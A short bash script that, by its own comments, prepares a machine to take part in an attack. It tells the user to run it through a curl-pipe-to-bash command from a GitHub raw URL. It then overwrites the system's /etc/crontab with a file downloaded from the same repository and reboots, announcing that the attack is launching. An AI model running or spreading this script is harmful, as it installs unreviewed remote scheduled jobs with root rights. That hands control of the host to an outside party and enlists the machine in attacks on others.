#!/bin/bash

##### Script downloading our crontab file to schedule the system
##### To run it just paste the following command to your Terminal:
# >>>>> curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/system_prepare.sh | bash <<<<<

sudo wget -O /etc/crontab https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/crontab

echo "Done preparing crontab file"

echo "Rebooting the system and launching the attack"

sudo reboot
